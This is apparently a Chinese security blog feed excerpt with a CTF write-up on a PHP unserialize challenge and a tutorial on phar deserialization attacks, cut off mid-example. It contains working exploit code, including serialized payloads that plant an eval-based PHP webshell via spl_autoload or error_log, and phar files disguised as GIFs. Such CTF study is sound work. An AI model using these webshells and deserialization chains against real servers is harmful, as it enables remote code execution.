&amp;lt;?php $serialized_object=&amp;#39;O:1:&amp;#34;a&amp;#34;:1:{s:5:&amp;#34;value&amp;#34;;s:3:&amp;#34;100&amp;#34;;}&amp;#39;; // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&amp;#39;unserialize_callback_func&amp;#39;, &amp;#39;mycallback&amp;#39;); // 设置您的回调函数  function mycallback($classname) { // 只需包含含有类定义的文件  // $classname 指出需要的是哪一个类 } ?</description>
			<content type="html"><![CDATA[<blockquote>
<p>五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了&hellip;</p>
</blockquote>
<p>题目给出源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$settings</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">settings</span><span class="o">=</span><span class="k">array</span><span class="p">(</span>
        <span class="s1">&#39;display_errors&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;On&#39;</span><span class="p">,</span>
        <span class="s1">&#39;allow_url_fopen&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;On&#39;</span>
        <span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">settings</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">ini_set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;settings.inc&#39;</span><span class="p">,</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span> 
</code></pre></div><h2 id="法一-反序列化回调函数后缀文件包含">法一 反序列化回调函数+后缀文件包含</h2>
<p>给了源码就好说，在本地测试一下。我们可以对<code>settings.inc</code>文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-04-image-20210504171255837.png" alt="image-20210504171255837"></p>
<p>就在官网手册的<strong>unserialize()</strong> 处发现了这个函数，官方给出的实例是这样的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$serialized_object</span><span class="o">=</span><span class="s1">&#39;O:1:&#34;a&#34;:1:{s:5:&#34;value&#34;;s:3:&#34;100&#34;;}&#39;</span><span class="p">;</span>

<span class="c1">// unserialize_callback_func 从 PHP 4.2.0 起可用
</span><span class="c1"></span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;unserialize_callback_func&#39;</span><span class="p">,</span> <span class="s1">&#39;mycallback&#39;</span><span class="p">);</span> <span class="c1">// 设置您的回调函数
</span><span class="c1"></span>
<span class="k">function</span> <span class="nf">mycallback</span><span class="p">(</span><span class="nv">$classname</span><span class="p">)</span> 
<span class="p">{</span>
   <span class="c1">// 只需包含含有类定义的文件
</span><span class="c1"></span>   <span class="c1">// $classname 指出需要的是哪一个类
</span><span class="c1"></span><span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>看到这个<code>ini_set()</code>&hellip;居然和题目的<code>__wakeup()</code>一模一样，那百分之百没得跑了。具体来说只要反序列化实例不存在的类，调用<code>unserialize_callback_func</code>就会把类名作为参数传递给回调函数。那么我们的回调函数设置为什么呢？第一个想到的是<code>include</code>，但这有一个问题。</p>
<p>如果要包含<code>settings.inc</code>，就得实例化这个类，但php类名是不能存在<code>.</code>这个字符的，over，翻手册，找到了
一个<code>spl_autoload</code>函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-04-image-20210504235914738.png" alt="image-20210504235914738"></p>
<p>这个函数支持使用<code>spl_autoload_extensions</code>拓展文件名</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">spl_autoload_extensions</span><span class="p">(</span><span class="s2">&#34;.php,.inc&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>如果没有，则默认这两个都拓展。拿一个小demo测试一下。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;unserialize_callback_func&#34;</span><span class="p">,</span><span class="s2">&#34;spl_autoload&#34;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">settings</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// $demo=new main;
</span><span class="c1"></span><span class="nv">$string</span><span class="o">=</span><span class="s1">&#39;O:4:&#34;main&#34;:1:{s:1:&#34;a&#34;;O:8:&#34;settings&#34;:0:{}}&#39;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$string</span><span class="p">));</span>
</code></pre></div><p>在<code>settings.inc</code>中写入<code>&lt;?php echo &quot;hello world&quot;?&gt;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505001830321.png" alt="image-20210505001830321"></p>
<p>在实例化<strong>settings</strong>这个类时调用了回调函数，执行<code>spl_autoload('settings')</code>，成功进行文件包含，那原题思路就很清晰了。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">settings</span><span class="p">{}</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$settings</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;unserialize_callback_func&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;spl_autoload&#34;</span><span class="p">);</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="s1">&#39;&lt;?php @eval($_POST[theoyu]) ?&gt;&#39;</span><span class="p">);</span>  
        <span class="cm">/* $this-&gt;params=serialize(new settings);*/</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$demo</span> <span class="o">=</span><span class="k">new</span> <span class="nx">main</span><span class="p">;</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">);</span>
</code></pre></div><p>先写入一句话木马，再执行注释部分文件包含即可。</p>
<h2 id="法二-利用错误信息写入一句胡">法二 利用错误信息写入一句胡</h2>
<p>在群里看到有人说好像利用<code>err_log()</code>方法可以将报错的信息写入指定的文件，有点像phpmyadmin日志写马那种，我也尝试了一下。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;error_log&#34;</span><span class="p">,</span><span class="s2">&#34;err.php&#34;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;unserialize_callback_func&#34;</span><span class="p">,</span><span class="s1">&#39;&lt;?php eval($_POST[theoyu]); ?&gt;&#39;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">settings</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// $demo=new main;
</span><span class="c1"></span><span class="nv">$string</span><span class="o">=</span><span class="s1">&#39;O:4:&#34;main&#34;:1:{s:1:&#34;a&#34;;O:8:&#34;settings&#34;:0:{}}&#39;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$string</span><span class="p">));</span>
</code></pre></div><p>思路是回调函数可控，调用回调函数时如果不存在就会报错，然后把函数设置为一句话即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505005235360.png" alt="image-20210505005235360"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505005919242.png" alt="image-20210505005919242"></p>
<p>看群里好像是有人为了防止<code>&lt;$</code>类似字符转义，多加了一个<code>html_errors=true</code>,结果导致被转义了&hellip;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505010415279.png" alt="image-20210505010415279"></p>
<p>看来是这位师傅多此一举，事实上出题人确实可以用默认为转义模式，需要我们构造<code>html_errors=false</code>去反转义，也是一个思路。</p>
]]></content>
		</item>
		
		<item>
			<title>利用 phar 拓展 php 反序列化漏洞攻击面</title>
			<link>https://theoyu.top/posts/phar/</link>
			<pubDate>Mon, 22 Feb 2021 11:19:11 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/phar/</guid>
			<description>phar文件结构 所有的Phar archives包含以下3-4个部分。
 a stub a manifest describing the contents the file contents [optional] a signature for verifying Phar integrity (phar file format only)  a stub 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;，前面内容不限，但必须以__HALT_COMPILER();?&amp;gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用setStub()设置存根。
a manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。
file contents 被压缩文件的内容。
a signature demo 通过一个简单案例创建phar文件，记住要把php.ini中的phar.readonly设置为Off。
&amp;lt;?php class TestObject { } @unlink(&amp;#34;phar.phar&amp;#34;); $phar = new Phar(&amp;#34;phar.phar&amp;#34;); //后缀名必须为phar  $phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;); //设置stub  $o = new TestObject(); $phar-&amp;gt;setMetadata($o); //将自定义的meta-data存入manifest  $phar-&amp;gt;addFile(&amp;#39;hack.php&amp;#39;);//添加要压缩的文件 ?&amp;gt;可以看到meta-data是以序列化的形式存储的：
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
   受影响函数列表        fileatime filectime file_exists file_get_contents   file_put_contents file filegroup fopen   fileinode filemtime fileowner fileperms   is_dir is_excutable is_file is_link   is_readable is_writable is_writeable parse_ini_file   copy unlink stat readfile    用一个小案例加以证明：</description>
			<content type="html"><![CDATA[<h2 id="phar文件结构">phar文件结构</h2>
<p>所有的<strong>Phar archives</strong>包含以下3-4个部分。</p>
<ol>
<li>a stub</li>
<li>a manifest describing the contents</li>
<li>the file contents</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)</li>
</ol>
<h3 id="a-stub">a stub</h3>
<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用<code>setStub()</code>设置存根。</p>
<h3 id="a-manifest">a manifest</h3>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-307317592.png" alt=""></p>
<h3 id="file-contents">file contents</h3>
<p>被压缩文件的内容。</p>
<h3 id="a-signature">a signature</h3>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3050303077.png" alt=""></p>
<h2 id="demo">demo</h2>
<p>通过一个简单案例创建phar文件，记住要把<code>php.ini</code>中的<strong>phar.readonly</strong>设置为<strong>Off</strong>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
</span><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFile</span><span class="p">(</span><span class="s1">&#39;hack.php&#39;</span><span class="p">);</span><span class="c1">//添加要压缩的文件
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>可以看到meta-data是以序列化的形式存储的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-390463059.png" alt=""></p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>受影响函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_excutable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<p>用一个小案例加以证明：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;phar://phar.phar/hack.php&#39;</span><span class="p">;</span>
<span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>执行结果如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="err">$</span> <span class="nx">php</span> <span class="o">.</span><span class="nx">\phar_des</span><span class="o">.</span><span class="nx">php</span>
<span class="nx">destruct</span>
</code></pre></div><p>同时，phar可以伪装成任意格式文件，php识别phar文件是通过其文件头的<strong>stub</strong>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对<strong>前面的内容</strong>或者<strong>后缀名</strong>是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
</span><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFile</span><span class="p">(</span><span class="s1">&#39;hack.php&#39;</span><span class="p">);</span><span class="c1">//添加要压缩的文件
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3155836478.png" alt=""></p>
<p>即使把phar后缀修改，也不会影响利用。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;phar://phar.gif/hack.php&#39;</span><span class="p">;</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>执行结果如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="err">$</span> <span class="nx">php</span> <span class="o">.</span><span class="nx">\phar_des</span><span class="o">.</span><span class="nx">php</span>
<span class="nx">destruct</span>
</code></pre></div><h2 id="利用实例">利用实例</h2>
<p>任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。</p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:,/,phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="swpuctf2018-simplephp">SWPUCTF2018 SimplePHP</h3>
<p>在查看文件处利用<code>?file</code>读取全部源代码,重点关注以下几处：
文件上传处的<code>function.php</code>有以下过滤：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">upload_file_check</span><span class="p">()</span> <span class="p">{</span> 
    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
    <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">);</span> 
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span> 
</code></pre></div><p>可以看到是白名单过滤，那上传这里做不了什么手脚，我们看看读取处。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
<span class="k">include</span> <span class="s1">&#39;function.php&#39;</span><span class="p">;</span> 
<span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span> 
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span> 
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span> 
<span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span> 
    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span> 
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span> 
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;file doesn\&#39;t exists.&#39;</span><span class="p">);</span> 
<span class="p">}</span> 
<span class="cp">?&gt;</span><span class="err"> 
</span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">C1e4r</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Show</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>   <span class="c1">//$this-&gt;source = phar://phar.jpg
</span><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
        <span class="p">}</span>
        
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&#34;hacker~&#34;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Test</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
